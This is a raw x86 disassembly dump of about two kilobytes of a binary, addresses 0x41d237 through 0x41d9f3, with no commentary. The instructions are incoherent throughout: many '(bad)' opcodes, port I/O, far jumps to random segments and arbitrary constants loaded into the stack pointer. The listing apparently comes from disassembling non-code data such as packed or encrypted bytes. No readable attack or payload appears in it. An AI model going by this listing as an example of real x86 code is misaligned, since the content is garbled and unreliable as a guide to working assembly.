  41d237:	pop    esp
  41d238:	mov    dh,BYTE PTR [eax-0x78]
  41d23b:	test   DWORD PTR [ecx],eax
  41d23d:	cmp    al,0xd5
  41d23f:	mov    edi,0x6321e561
  41d244:	stc    
  41d245:	imul   BYTE PTR [ecx]
  41d247:	jg     0x41d25d
  41d249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d24a:	out    dx,al
  41d24b:	cmovne ebx,DWORD PTR [ebp-0x24]
  41d24f:	xor    ebp,edi
  41d251:	xchg   ebp,eax
  41d252:	push   edi
  41d253:	dec    ebp
  41d254:	mov    esp,0x54d751eb
  41d259:	mov    ebx,0xa5e6bfb3
  41d25e:	je     0x41d215
  41d260:	mov    ds:0x7da32f7e,eax
  41d265:	mov    ebp,0xb723f129
  41d26a:	loope  0x41d204
  41d26c:	and    cl,BYTE PTR [edx-0x45c991c8]
  41d272:	ret    
  41d273:	jmp    0x754d:0x644f5825
  41d27a:	test   esi,esp
  41d27c:	inc    ebx
  41d27d:	cmc    
  41d27e:	cmp    eax,0x16431d77
  41d283:	es sti 
  41d285:	pop    ecx
  41d286:	sti    
  41d287:	sub    DWORD PTR [ebx-0x34],0x29
  41d28b:	pop    ds
  41d28c:	or     eax,0xee9b86eb
  41d291:	jge    0x41d2ab
  41d293:	mov    bh,0x98
  41d295:	test   DWORD PTR [edi+0x1a48ba72],0xfbb60167
  41d29f:	sub    BYTE PTR [ebx+0x497335b6],bl
  41d2a5:	test   eax,0xbe5be977
  41d2aa:	sbb    dl,ch
  41d2ac:	popf   
  41d2ad:	jp     0x41d2cf
  41d2af:	xlat   BYTE PTR ds:[ebx]
  41d2b0:	xor    BYTE PTR [ebx-0x25],0xd0
  41d2b4:	stos   DWORD PTR es:[edi],eax
  41d2b5:	or     ah,dh
  41d2b7:	pop    ss
  41d2b8:	xor    eax,0xd5002bc1
  41d2bd:	mov    BYTE PTR [esi],dh
  41d2bf:	pop    es
  41d2c0:	and    bl,BYTE PTR [eax-0x4a]
  41d2c3:	pop    esp
  41d2c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2c5:	mov    dl,0x59
  41d2c7:	sub    al,0x96
  41d2c9:	push   0xffffffd6
  41d2cb:	jbe    0x41d2f0
  41d2cd:	and    BYTE PTR [ebp+0xd36e68d],dh
  41d2d3:	or     eax,0x47907fbc
  41d2d8:	aas    
  41d2d9:	into   
  41d2da:	sbb    BYTE PTR [esi-0x3beaf210],dh
  41d2e0:	retf   0x1911
  41d2e3:	out    0x2c,eax
  41d2e5:	xor    bh,dh
  41d2e7:	out    dx,eax
  41d2e8:	jbe    0x41d2d1
  41d2ea:	adc    BYTE PTR [edx*4+0x54026741],dh
  41d2f1:	in     eax,0xbc
  41d2f3:	fs mov ah,0xc2
  41d2f6:	in     eax,dx
  41d2f7:	ror    edi,1
  41d2f9:	call   0x8c13:0x6eb73b99
  41d300:	repz test eax,0xb125f85f
  41d306:	xchg   edi,eax
  41d307:	fs cmp al,0xa5
  41d30a:	test   BYTE PTR [ebx+0x6e77cb40],bh
  41d310:	mov    esp,0xcfcb7bad
  41d315:	test   DWORD PTR [ebp+0x7700e285],eax
  41d31b:	and    al,0x93
  41d31d:	pusha  
  41d31e:	sbb    cl,BYTE PTR [ebp+0x5f]
  41d321:	mov    eax,0x450d76cf
  41d326:	ret    0xf328
  41d329:	or     DWORD PTR [esp+eiz*4],edi
  41d32c:	mov    ebx,0xdc5f798f
  41d331:	lahf   
  41d332:	mov    ebp,0x2e549b55
  41d337:	ja     0x41d387
  41d339:	sahf   
  41d33a:	mov    ebp,0x2a602830
  41d33f:	sub    al,0x7
  41d341:	loopne 0x41d356
  41d343:	js     0x41d362
  41d345:	cmp    esi,DWORD PTR [edx+0x22]
  41d348:	mov    dl,0xab
  41d34a:	pop    ds
  41d34b:	mov    dl,0xac
  41d34d:	mov    cl,BYTE PTR [edi]
  41d34f:	xchg   ecx,eax
  41d350:	sti    
  41d351:	pop    edi
  41d352:	mov    WORD PTR [edi],?
  41d354:	dec    edx
  41d355:	call   0xae9:0xb7b6da3a
  41d35c:	xchg   esp,eax
  41d35d:	popa   
  41d35e:	jns    0x41d338
  41d360:	ins    DWORD PTR es:[edi],dx
  41d361:	mov    esp,0x1f30d5ac
  41d366:	jbe    0x41d34d
  41d368:	cmp    DWORD PTR [ebx+0x1c],edi
  41d36b:	rol    BYTE PTR [edi],0xd3
  41d36e:	je     0x41d317
  41d370:	push   esp
  41d371:	add    ebp,DWORD PTR [ebx+0x1ab41db6]
  41d377:	add    DWORD PTR [esi],ebp
  41d379:	(bad)  
  41d37a:	mov    ds:0x57f49f23,eax
  41d380:	mov    eax,ds:0xb2df49c7
  41d385:	pop    ss
  41d386:	popa   
  41d387:	int3   
  41d388:	xchg   edx,eax
  41d389:	jbe    0x41d342
  41d38b:	out    0x1,eax
  41d38d:	je     0x41d32e
  41d38f:	jmp    0xd4a3:0xc3d85cb2
  41d396:	push   edi
  41d397:	push   ebp
  41d398:	xchg   edx,eax
  41d399:	mov    esi,esp
  41d39b:	sub    al,0xb9
  41d39d:	ss cmp al,0x7e
  41d3a0:	std    
  41d3a1:	or     DWORD PTR [edx],ebx
  41d3a3:	add    eax,esp
  41d3a5:	pop    es
  41d3a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3a7:	mov    ebp,0x85fd480b
  41d3ac:	mov    bh,cl
  41d3ae:	inc    edx
  41d3af:	push   ds
  41d3b0:	mov    dl,0xe8
  41d3b2:	shl    BYTE PTR [ebx-0x50],cl
  41d3b5:	mov    dh,0x19
  41d3b7:	push   0x4f8b4177
  41d3bc:	cmp    DWORD PTR [ebp+0x49eac40a],ebx
  41d3c2:	mov    ah,0x3
	...
  41d3d0:	add    BYTE PTR [edx-0x300eb0aa],bl
  41d3d6:	stc    
  41d3d7:	mov    esi,0xe316497f
  41d3dc:	stos   BYTE PTR es:[edi],al
  41d3dd:	lahf   
  41d3de:	out    0x9d,eax
  41d3e0:	pop    edi
  41d3e1:	mov    edi,0xab00014f
  41d3e6:	add    eax,DWORD PTR [eax]
  41d3e8:	add    BYTE PTR [eax-0x65fe8209],ah
  41d3ee:	push   ecx
  41d3ef:	loopne 0x41d3c4
  41d3f1:	(bad)  
  41d3f2:	(bad)  
  41d3f3:	in     eax,0x77
  41d3f5:	lods   al,BYTE PTR ds:[esi]
  41d3f6:	xor    ch,BYTE PTR [ebx-0x76fc9a85]
  41d3fc:	mov    ebp,ebp
  41d3fe:	ds stc 
  41d400:	push   0xfffffff4
  41d402:	push   esi
  41d403:	bound  esi,QWORD PTR ds:0xfdb3933c
  41d409:	sti    
  41d40a:	push   eax
  41d40b:	push   eax
  41d40c:	sub    eax,0xfb9297cf
  41d411:	nop
  41d412:	push   edi
  41d413:	les    ecx,FWORD PTR [edi]
  41d415:	pop    edi
  41d416:	(bad)  
  41d417:	(bad)  
  41d418:	jmp    0xbc44:0xebc95c9c
  41d41f:	popa   
  41d420:	sbb    dl,BYTE PTR [ecx]
  41d422:	add    ecx,DWORD PTR [edi-0x78a1d289]
  41d428:	repnz popf 
  41d42a:	adc    al,0x3
  41d42c:	cmp    eax,0xd9ba3a58
  41d431:	xchg   edi,eax
  41d432:	or     eax,0x212edf89
  41d437:	cmc    
  41d438:	cmc    
  41d439:	clc    
  41d43a:	add    al,0x86
  41d43c:	mov    ch,0xd6
  41d43e:	punpckhbw mm3,mm5
  41d441:	(bad)  
  41d442:	sbb    cl,dh
  41d444:	es ins BYTE PTR es:[edi],dx
  41d446:	adc    al,0x90
  41d448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d449:	inc    edi
  41d44a:	(bad)  
  41d44b:	xor    DWORD PTR [edi+0x67d7ca5f],eax
  41d451:	jg     0x41d481
  41d453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d454:	or     BYTE PTR [edi-0x725c6202],cl
  41d45a:	dec    ebp
  41d45b:	push   ecx
  41d45c:	mov    eax,ds:0xb31e4911
  41d461:	mov    ah,0x54
  41d463:	jl     0x41d48f
  41d465:	cdq    
  41d466:	xchg   ebp,eax
  41d467:	hlt    
  41d468:	daa    
  41d469:	cli    
  41d46a:	adc    BYTE PTR [ecx],bl
  41d46c:	and    ax,0x9fc9
  41d470:	sub    DWORD PTR [ebp-0x16],ebp
  41d473:	sub    al,al
  41d475:	dec    edx
  41d476:	mov    dh,0x2d
  41d478:	sub    DWORD PTR [edi],ebp
  41d47a:	aam    0x1b
  41d47c:	mov    edx,0xce2cc4c2
  41d481:	lahf   
  41d482:	fidiv  WORD PTR [ebx]
  41d484:	xchg   edi,eax
  41d485:	cwde   
  41d486:	cmp    eax,0x82b98e87
  41d48b:	xor    eax,0xefe2b9ef
  41d490:	les    esi,FWORD PTR [ecx-0x20eae796]
  41d496:	fidivr DWORD PTR [eax+0x9]
  41d499:	shl    esp,cl
  41d49b:	sub    ecx,esp
  41d49d:	mov    esp,0x8d7f430a
  41d4a2:	fwait
  41d4a3:	and    BYTE PTR [esi],cl
  41d4a5:	xor    DWORD PTR [eax-0x30],0x4ae1bab1
  41d4ac:	xor    edi,DWORD PTR [esi-0x78401bc5]
  41d4b2:	ds jno 0x41d4f7
  41d4b5:	ret    
  41d4b6:	das    
  41d4b7:	or     DWORD PTR [ecx-0x1a],0x717111f8
  41d4be:	xor    al,0x41
  41d4c0:	xchg   ebp,eax
  41d4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4c2:	inc    edx
  41d4c3:	js     0x41d479
  41d4c5:	push   ebx
  41d4c6:	bound  ebp,QWORD PTR [esi+0x44]
  41d4c9:	test   BYTE PTR ds:0xbad7d3ba,0x37
  41d4d0:	sbb    esi,DWORD PTR [eax]
  41d4d2:	xchg   BYTE PTR [edi-0x7d],al
  41d4d5:	stos   BYTE PTR es:[edi],al
  41d4d6:	mov    WORD PTR [edi],es
  41d4d8:	xor    esp,ebx
  41d4da:	cli    
  41d4db:	inc    eax
  41d4dc:	push   edx
  41d4dd:	cmp    edx,DWORD PTR [ebx]
  41d4df:	sbb    DWORD PTR ds:0x3b30209d,0x4aff7436
  41d4e9:	pusha  
  41d4ea:	adc    al,0x66
  41d4ec:	gs pop eax
  41d4ee:	add    esp,edi
  41d4f0:	repnz test DWORD PTR [ebp+eiz*8-0x41],eax
  41d4f5:	fisub  DWORD PTR [esi]
  41d4f7:	pop    ds
  41d4f8:	xor    esi,ecx
  41d4fa:	data16 dec ax
  41d4fd:	jle    0x41d512
  41d4ff:	lods   al,BYTE PTR ds:[esi]
  41d500:	push   es
  41d501:	mov    WORD PTR [ebx+0x27],gs
  41d504:	cwde   
  41d505:	mov    ch,BYTE PTR [eax]
  41d507:	imul   ebp,DWORD PTR ds:0x5acea611,0x86f8c050
  41d511:	clc    
  41d512:	sahf   
  41d513:	popf   
  41d514:	xchg   esi,eax
  41d515:	ror    BYTE PTR [edi-0x79a9d2d9],0x67
  41d51c:	or     dl,dh
  41d51e:	out    0xdd,al
  41d520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d521:	cli    
  41d522:	mov    al,ds:0x585a8480
  41d527:	scas   eax,DWORD PTR es:[edi]
  41d528:	fidivr WORD PTR [edi+0x78]
  41d52b:	sbb    al,0x80
  41d52d:	mov    DWORD PTR ds:0x43ff8aa4,esp
  41d533:	jmp    0x598692c0
  41d538:	adc    eax,0x12192e3a
  41d53d:	add    al,0xd
  41d53f:	ret    0x40
  41d542:	and    al,0xbb
  41d544:	dec    ecx
  41d545:	jl     0x41d516
  41d547:	pop    esi
  41d548:	dec    edx
  41d549:	push   ds
  41d54a:	push   ss
  41d54b:	dec    ecx
  41d54c:	ret    
  41d54d:	or     al,bl
  41d54f:	mov    ecx,0x9eb0f31
  41d554:	mov    ebp,0xa33c5f3a
  41d559:	leave  
  41d55a:	and    bl,BYTE PTR [edx+edx*2-0x205dbfa5]
  41d561:	es dec edi
  41d563:	mov    esi,0xba1bf07d
  41d568:	mov    edi,ds
  41d56a:	imul   ebp,DWORD PTR [eax-0x1],0x5c6fb816
  41d571:	jb     0x41d5a7
  41d573:	sbb    eax,0x49b0b0bf
  41d578:	cmp    al,0xc3
  41d57a:	dec    esp
  41d57b:	cmp    eax,0xdf93fe13
  41d580:	xchg   edi,eax
  41d581:	or     ecx,DWORD PTR [esi]
  41d583:	ficomp WORD PTR [edx+0x77]
  41d586:	loop   0x41d5a5
  41d588:	xor    DWORD PTR [eax-0x181b6d3c],esp
  41d58e:	fstp   DWORD PTR [ecx+0x71e521cb]
  41d594:	dec    edi
  41d595:	rcl    DWORD PTR [edx-0x56],1
  41d598:	push   eax
  41d599:	sbb    eax,0x9bed9baa
  41d59e:	inc    edi
  41d59f:	test   al,0x8c
  41d5a1:	outs   dx,DWORD PTR ds:[esi]
  41d5a2:	(bad)  
  41d5a3:	out    dx,al
  41d5a4:	pop    ebx
  41d5a5:	stos   DWORD PTR es:[edi],eax
  41d5a6:	lods   al,BYTE PTR ds:[esi]
  41d5a7:	jo     0x41d60f
  41d5a9:	mov    DWORD PTR [eax-0x3b31ef71],0x7380a2f9
  41d5b3:	mov    BYTE PTR [ecx+0x67],al
  41d5b6:	call   0x52c5:0x8648cd0a
  41d5bd:	jge    0x41d548
  41d5bf:	dec    esi
  41d5c0:	and    bl,dh
  41d5c2:	aad    0x23
  41d5c4:	outs   dx,BYTE PTR ds:[esi]
  41d5c5:	scas   eax,DWORD PTR es:[edi]
  41d5c6:	popf   
  41d5c7:	adc    esi,DWORD PTR [edi]
  41d5c9:	mov    esp,0xc017efe5
  41d5ce:	inc    esi
  41d5cf:	adc    BYTE PTR [ebp+0x176ee3ab],ch
  41d5d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5d6:	test   DWORD PTR [ebp+0xb],ebp
  41d5d9:	push   0xffffffaf
  41d5db:	jno    0x41d5b7
  41d5dd:	shr    DWORD PTR [eax],0xb9
  41d5e0:	inc    ebx
  41d5e1:	(bad)  
  41d5e2:	cld    
  41d5e3:	stc    
  41d5e4:	in     al,dx
  41d5e5:	push   es
  41d5e6:	dec    edx
  41d5e7:	dec    ebx
  41d5e8:	mov    edi,0xeaac9a42
  41d5ed:	push   cs
  41d5ee:	mov    eax,ds:0x386f1d4f
  41d5f3:	rol    BYTE PTR [bp+si-0x2195],0xdb
  41d5f9:	std    
  41d5fa:	and    eax,0x44a6506b
  41d5ff:	sti    
  41d600:	leave  
  41d601:	fsubr  DWORD PTR [esi+0x4e641661]
  41d607:	push   ebx
  41d608:	or     ebx,ecx
  41d60a:	(bad)  
  41d60b:	xchg   esp,eax
  41d60c:	cmp    BYTE PTR [ebx],0x8d
  41d60f:	ins    DWORD PTR es:[edi],dx
  41d610:	pop    ds
  41d611:	aaa    
  41d612:	mov    ds:0xaf73ae86,eax
  41d617:	sub    al,0x13
  41d619:	pop    edi
  41d61a:	mul    BYTE PTR [ebx]
  41d61c:	jge    0x41d672
  41d61e:	fild   WORD PTR [edi-0x4e]
  41d621:	inc    edi
  41d622:	stos   DWORD PTR es:[edi],eax
  41d623:	push   es
  41d624:	sti    
  41d625:	fdivp  st(2),st
  41d627:	xor    edi,DWORD PTR [ebx+0x63]
  41d62a:	sar    eax,cl
  41d62c:	xor    DWORD PTR [edi],edx
  41d62e:	push   esi
  41d62f:	jno    0x41d6ab
  41d631:	pop    es
  41d632:	lock into 
  41d634:	dec    ebx
  41d635:	cmp    ah,BYTE PTR [edi-0x329f8030]
  41d63b:	out    0x90,eax
  41d63d:	icebp  
  41d63e:	test   eax,0xe0c47080
  41d643:	fs push eax
  41d645:	in     eax,0x1c
  41d647:	sub    BYTE PTR [esi-0x90a4ba9],dh
  41d64d:	js     0x41d660
  41d64f:	retf   0x1660
  41d652:	aam    0x97
  41d654:	mov    dl,0xd4
  41d656:	pop    esp
  41d657:	pop    ebp
  41d658:	test   al,0xec
  41d65a:	and    al,0x86
  41d65c:	add    bh,cl
  41d65e:	loop   0x41d664
  41d660:	fisttp WORD PTR [ebp-0x56]
  41d663:	jl     0x41d5f8
  41d665:	daa    
  41d666:	jne    0x41d607
  41d668:	push   cs
  41d669:	rcl    DWORD PTR [ebx+0x6b],0x12
  41d66d:	cld    
  41d66e:	sahf   
  41d66f:	xor    BYTE PTR [esi-0x1dca46bf],0x4d
  41d676:	push   esp
  41d677:	fwait
  41d678:	inc    ebp
  41d679:	pop    esp
  41d67a:	cmp    al,0xc5
  41d67c:	push   edi
  41d67d:	sbb    dh,cl
  41d67f:	jns    0x41d640
  41d681:	bound  edx,QWORD PTR [eax+ecx*8]
  41d684:	or     DWORD PTR [eax+0x7b],ebp
  41d687:	mov    al,BYTE PTR [edi]
  41d689:	jae    0x41d664
  41d68b:	(bad)  
  41d68c:	fistp  QWORD PTR [ecx-0x35]
  41d68f:	xor    al,0xb4
  41d691:	lods   eax,DWORD PTR ds:[esi]
  41d692:	fwait
  41d693:	outs   dx,DWORD PTR ds:[esi]
  41d694:	and    al,0x37
  41d696:	jb     0x41d6d0
  41d698:	jae    0x41d6c0
  41d69a:	dec    eax
  41d69b:	add    dh,BYTE PTR [ebp-0x122efc1b]
  41d6a1:	push   ss
  41d6a2:	inc    BYTE PTR [ebx-0x4c]
  41d6a5:	test   DWORD PTR [edi+0x14c400fb],ebx
  41d6ab:	cmp    bl,BYTE PTR cs:[ebx+0x78699cdc]
  41d6b2:	jg     0x41d681
  41d6b4:	jmp    0x41d6d8
  41d6b6:	cmp    DWORD PTR [esi-0x1dce39d4],eax
  41d6bc:	sub    ch,BYTE PTR fs:[ecx+0x20c2821b]
  41d6c3:	fild   QWORD PTR [ecx-0x5e12dcb5]
  41d6c9:	pop    ebp
  41d6ca:	lahf   
  41d6cb:	push   eax
  41d6cc:	aas    
  41d6cd:	loop   0x41d6ed
  41d6cf:	jne    0x41d6f0
  41d6d1:	es cmp al,0xa9
  41d6d4:	js     0x41d6af
  41d6d6:	or     al,0xf1
  41d6d8:	mov    ecx,DWORD PTR [ecx+eiz*2-0x2a]
  41d6dc:	inc    ebx
  41d6dd:	mov    gs,WORD PTR [ebx]
  41d6df:	fild   WORD PTR [eax-0x4773bc68]
  41d6e5:	lock arpl bx,cx
  41d6e8:	mov    bh,0x5c
  41d6ea:	stos   BYTE PTR es:[edi],al
  41d6eb:	mov    DWORD PTR [edi],edx
  41d6ed:	(bad)  
  41d6ee:	(bad)
  41d6f1:	cmp    eax,0xc501782b
  41d6f6:	push   ds
  41d6f7:	cmp    al,0x6c
  41d6f9:	or     eax,0xadec5851
  41d6fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6ff:	lds    edx,FWORD PTR [ebx]
  41d701:	mov    al,ds:0xa3ded177
  41d707:	aad    0x42
  41d709:	scas   al,BYTE PTR es:[edi]
  41d70a:	and    edi,DWORD PTR [edx-0x877098e]
  41d710:	popa   
  41d711:	and    eax,0x3250a771
  41d716:	or     BYTE PTR ds:0x36586463,dh
  41d71c:	(bad)  
  41d71d:	push   ss
  41d71e:	out    0x3,al
  41d720:	rcr    DWORD PTR [edx+0x33e269e8],cl
  41d726:	xor    DWORD PTR [esi+0x31],eax
  41d729:	gs jae 0x41d747
  41d72c:	lea    esi,[eax]
  41d72e:	add    bh,BYTE PTR [esi+0x69a3074b]
  41d734:	and    DWORD PTR [eax-0x65],edx
  41d737:	cmp    al,0x4c
  41d739:	adc    BYTE PTR [eax-0x392674e7],ch
  41d73f:	popa   
  41d740:	imul   ebx,DWORD PTR [ecx-0x3027206c],0xb0ba614c
  41d74a:	inc    edx
  41d74b:	add    DWORD PTR [edx+0x29adfe19],ebx
  41d751:	(bad)  
  41d752:	imul   esi,ebx,0x15
  41d755:	mov    ecx,0x6f7209db
  41d75a:	das    
  41d75b:	mov    eax,0x1f85da7e
  41d760:	hlt    
  41d761:	and    eax,0x16ac2ab6
  41d766:	pop    si
  41d768:	inc    edi
  41d769:	mov    WORD PTR [eax+0x72],gs
  41d76c:	cmp    cl,dh
  41d76e:	dec    ecx
  41d76f:	xchg   ebx,eax
  41d770:	push   esp
  41d771:	rol    BYTE PTR [edi-0x6ae07854],0x14
  41d778:	les    esi,FWORD PTR [ebp-0x6b]
  41d77b:	jne    0x41d799
  41d77d:	test   eax,0x27a5f9ee
  41d782:	data16 mov cl,0xff
  41d785:	and    eax,0x79cd2d37
  41d78a:	cdq    
  41d78b:	jb     0x41d73d
  41d78d:	das    
  41d78e:	data16 test al,0xf2
  41d791:	xor    al,BYTE PTR [ebp-0x45]
	...
  41d7a0:	add    ah,bh
  41d7a2:	xlat   BYTE PTR ds:[ebx]
  41d7a3:	dec    esp
  41d7a4:	call   0xd83ed318
  41d7a9:	adc    BYTE PTR [ecx-0x55ffec5e],ah
  41d7af:	iret   
  41d7b0:	and    eax,0x1536a
  41d7b5:	stos   DWORD PTR es:[edi],eax
  41d7b6:	add    eax,DWORD PTR [eax]
  41d7b8:	add    BYTE PTR [esi+0x308f71b5],bl
  41d7be:	out    dx,al
  41d7bf:	push   ecx
  41d7c0:	and    al,0x45
  41d7c2:	sub    esi,DWORD PTR [edx]
  41d7c4:	ret    
  41d7c5:	sahf   
  41d7c6:	out    dx,eax
  41d7c7:	outs   dx,DWORD PTR ds:[esi]
  41d7c8:	jae    0x41d7a4
  41d7ca:	xor    bl,ah
  41d7cc:	fwait
  41d7cd:	cmp    al,0xeb
  41d7cf:	mov    esi,0xd287ad49
  41d7d4:	jg     0x41d847
  41d7d6:	pop    edi
  41d7d7:	sbb    esp,DWORD PTR [edx-0x574e9aa]
  41d7dd:	test   BYTE PTR [esi+ebx*8],bl
  41d7e0:	fwait
  41d7e1:	retf   
  41d7e2:	out    dx,eax
  41d7e3:	xchg   ebp,eax
  41d7e4:	push   edx
  41d7e5:	ss in  eax,0x58
  41d7e8:	or     al,0x85
  41d7ea:	push   esi
  41d7eb:	retf   0xc6ae
  41d7ee:	call   DWORD PTR [eax-0x743c4b65]
  41d7f4:	mov    edi,0xe3ae9bbe
  41d7f9:	mov    ecx,cs
  41d7fb:	jo     0x41d7b8
  41d7fd:	lock cmp eax,0xcf98b8da
  41d803:	pop    esi
  41d804:	in     al,0x56
  41d806:	mov    ?,eax
  41d808:	(bad)  
  41d809:	adc    BYTE PTR [ebx+0x56],ch
  41d80c:	ret    
  41d80d:	pop    ecx
  41d80e:	loope  0x41d7d5
  41d810:	inc    ebx
  41d811:	pop    ds
  41d812:	jge    0x41d7fe
  41d814:	dec    dl
  41d816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d817:	cwde   
  41d818:	clc    
  41d819:	ret    0x56e9
  41d81c:	fs pop esp
  41d81e:	sub    eax,0xf4559f49
  41d823:	jae    0x41d82f
  41d825:	syscall 
  41d827:	push   ebp
  41d828:	stos   BYTE PTR es:[edi],al
  41d829:	mov    ebp,0xb805d533
  41d82e:	mov    ecx,0x6a23a38a
  41d833:	cmp    eax,0x2b5a9d17
  41d838:	test   ebp,ecx
  41d83a:	sub    al,0xe5
  41d83c:	ffreep st(1)
  41d83e:	mov    al,0xf1
  41d840:	test   cl,ch
  41d842:	loopne 0x41d879
  41d844:	inc    edi
  41d845:	retf   
  41d846:	bound  ebp,QWORD PTR [edx+0x4ec09f9d]
  41d84c:	adc    al,0x1a
  41d84e:	into   
  41d84f:	cs adc eax,0xeb29a03
  41d855:	cmp    esp,DWORD PTR [edx+0x724e5dac]
  41d85b:	pop    edi
  41d85c:	jmp    0x41d7fa
  41d85e:	(bad)  
  41d85f:	pop    ecx
  41d860:	mov    ah,BYTE PTR [eax+0x62]
  41d863:	xchg   esi,eax
  41d864:	in     eax,0x75
  41d866:	cmp    BYTE PTR [eax],ch
  41d868:	pop    edi
  41d869:	fs mov esp,0xb219b01a
  41d86f:	or     DWORD PTR [esi],0xf2a7a53f
  41d875:	out    dx,al
  41d876:	push   cs
  41d877:	mov    edi,0xd8aa4952
  41d87c:	and    eax,0xd88e2159
  41d881:	jo     0x41d8b2
  41d883:	test   ecx,0x99aa011a
  41d889:	mov    bh,0xa4
  41d88b:	in     eax,0xfa
  41d88d:	mov    al,ds:0x4526b4d0
  41d892:	ss jl  0x41d82d
  41d895:	pop    ss
  41d896:	jle    0x41d8c2
  41d898:	pop    esp
  41d899:	mov    ds:0xf48ea869,eax
  41d89e:	or     al,0x8c
  41d8a0:	add    DWORD PTR [eax+0x6d96bfb6],eax
  41d8a6:	jecxz  0x41d859
  41d8a8:	jo     0x41d8f2
  41d8aa:	cs mov ecx,0x8447f884
  41d8b0:	js     0x41d8d3
  41d8b2:	imul   ebx,eax,0xb234d618
  41d8b8:	mov    ebp,0xc75838dc
  41d8bd:	or     BYTE PTR [ebx+0x522f22e1],0x6c
  41d8c4:	jmp    0x7b3db73a
  41d8c9:	lahf   
  41d8ca:	mov    ebx,0xc8e6f44c
  41d8cf:	fldenv [edi-0x6c]
  41d8d2:	sbb    BYTE PTR es:0x1ea4c42,0x6
  41d8da:	test   BYTE PTR [edi+0x74ff4e30],ah
  41d8e0:	inc    edi
  41d8e1:	sbb    BYTE PTR [eax],al
  41d8e3:	pop    edi
  41d8e4:	ja     0x41d886
  41d8e6:	dec    esp
  41d8e7:	mov    ebx,0xe46c13a5
  41d8ec:	std    
  41d8ed:	hlt    
  41d8ee:	jne    0x41d953
  41d8f0:	popa   
  41d8f1:	test   ebx,esp
  41d8f3:	dec    esp
  41d8f4:	mov    eax,ds:0xd954ce11
  41d8f9:	mov    ds:0x528e6ac6,eax
  41d8fe:	pop    edx
  41d8ff:	fild   WORD PTR [ebx]
  41d901:	adc    eax,0xfeb792e4
  41d906:	std    
  41d907:	adc    eax,DWORD PTR [ebp-0x529334f3]
  41d90d:	ret    0xdbe8
  41d910:	add    bl,dh
  41d912:	ja     0x41d928
  41d914:	retf   0x37fc
  41d917:	xor    esp,DWORD PTR ds:0x3b8f1494
  41d91d:	(bad)  
  41d91f:	xchg   ecx,eax
  41d920:	mov    ch,0xfb
  41d922:	push   esi
  41d923:	pop    ds
  41d924:	stos   BYTE PTR es:[edi],al
  41d925:	lods   eax,DWORD PTR ds:[esi]
  41d926:	repnz pusha 
  41d928:	sub    eax,0xb9aaa32b
  41d92d:	test   eax,0xc5feb726
  41d932:	fist   WORD PTR [edi-0xbca0b02]
  41d938:	pop    edi
  41d939:	mov    ds:0xb2e1d245,eax
  41d93e:	out    0x14,al
  41d940:	sbb    al,0x60
  41d942:	cmp    eax,0x228714fc
  41d947:	and    ecx,DWORD PTR [ebx-0x27bf65c9]
  41d94d:	sub    dh,dh
  41d94f:	xchg   ebx,eax
  41d950:	jae    0x41d95e
  41d952:	or     DWORD PTR [edx-0x4d51ef05],ebp
  41d958:	inc    ecx
  41d959:	and    al,0x22
  41d95b:	xor    esi,esi
  41d95d:	pop    eax
  41d95e:	mov    ah,bh
  41d960:	pop    edi
  41d961:	stos   DWORD PTR es:[edi],eax
  41d962:	inc    BYTE PTR [edi-0xaf72d84]
  41d968:	pop    ss
  41d969:	bound  eax,QWORD PTR [ebx]
  41d96b:	cwde   
  41d96c:	cmp    bh,bh
  41d96e:	xchg   esp,eax
  41d96f:	fadd   QWORD PTR [ebx+edx*1+0x190ced36]
  41d976:	rcl    DWORD PTR [esi+0x2c],0x12
  41d97a:	sbb    al,0x49
  41d97c:	pop    ss
  41d97d:	mov    ch,ah
  41d97f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d980:	rcr    esp,cl
  41d982:	ins    BYTE PTR es:[edi],dx
  41d983:	int3   
  41d984:	adc    al,0x83
  41d986:	imul   ebx,ebp,0x7c
  41d989:	outs   dx,BYTE PTR ds:[esi]
  41d98a:	ret    0xc986
  41d98d:	mov    cl,0x17
  41d98f:	xlat   BYTE PTR ds:[ebx]
  41d990:	dec    DWORD PTR [eax]
  41d992:	fwait
  41d993:	adc    bl,ah
  41d995:	or     eax,edx
  41d997:	inc    BYTE PTR [edx-0x74]
  41d99a:	xchg   ebp,eax
  41d99b:	or     DWORD PTR [esi+0x28],eax
  41d99e:	daa    
  41d99f:	test   al,0xef
  41d9a1:	leave  
  41d9a2:	pcmpgtd mm3,QWORD PTR [ebx-0x34]
  41d9a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9a7:	lods   eax,DWORD PTR ds:[esi]
  41d9a8:	rol    ah,cl
  41d9aa:	pop    esp
  41d9ab:	aam    0xfd
  41d9ad:	mov    WORD PTR [edi+eax*1-0x13],?
  41d9b1:	stos   BYTE PTR es:[edi],al
  41d9b2:	arpl   WORD PTR [esp-0x4a],ax
  41d9b6:	dec    eax
  41d9b7:	push   ecx
  41d9b8:	sti    
  41d9b9:	dec    ebx
  41d9ba:	cdq    
  41d9bb:	or     DWORD PTR [esi-0xe59c0a4],0x85f72441
  41d9c5:	stc    
  41d9c6:	sbb    BYTE PTR [edi+edx*8-0x6f],ch
  41d9ca:	outs   dx,DWORD PTR ds:[esi]
  41d9cb:	pushw  0xffcb
  41d9ce:	xchg   edx,ebp
  41d9d0:	xchg   esp,eax
  41d9d1:	dec    ecx
  41d9d2:	inc    ebp
  41d9d3:	cmp    DWORD PTR [esi],esi
  41d9d5:	cmp    al,0x79
  41d9d7:	dec    esi
  41d9d8:	ds std 
  41d9da:	push   0xab7c5678
  41d9df:	in     al,dx
  41d9e0:	je     0x41da59
  41d9e2:	scas   al,BYTE PTR es:[edi]
  41d9e3:	das    
  41d9e4:	jno    0x41d9f4
  41d9e6:	xor    DWORD PTR [edx],ebp
  41d9e8:	popf   
  41d9e9:	mov    gs,WORD PTR [esp+ebp*8+0x523f1c77]
  41d9f0:	dec    esi
  41d9f1:	jbe    0x41d9d0
  41d9f3:	ja     0x41d9cd
